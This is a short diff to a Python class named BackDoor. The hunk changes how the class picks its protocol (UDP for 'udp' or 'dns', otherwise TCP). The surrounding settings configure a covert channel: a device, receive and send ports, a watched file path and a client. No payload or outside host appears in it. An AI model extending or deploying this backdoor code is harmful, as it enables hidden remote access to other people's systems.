@@ -202,7 +202,7 @@ class BackDoor:
         self.device = config['covert']['device']
         self.recv_port = config['covert']['recv_port']
         self.send_port = config['covert']['send_port']
-        self.proto = config['share']['proto']
+        self.proto = "udp" if config['share']['proto'] in ["udp", "dns"] else "tcp"
         self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
         self.path = config['covert']['watch']
         self.client = config['covert']['client']
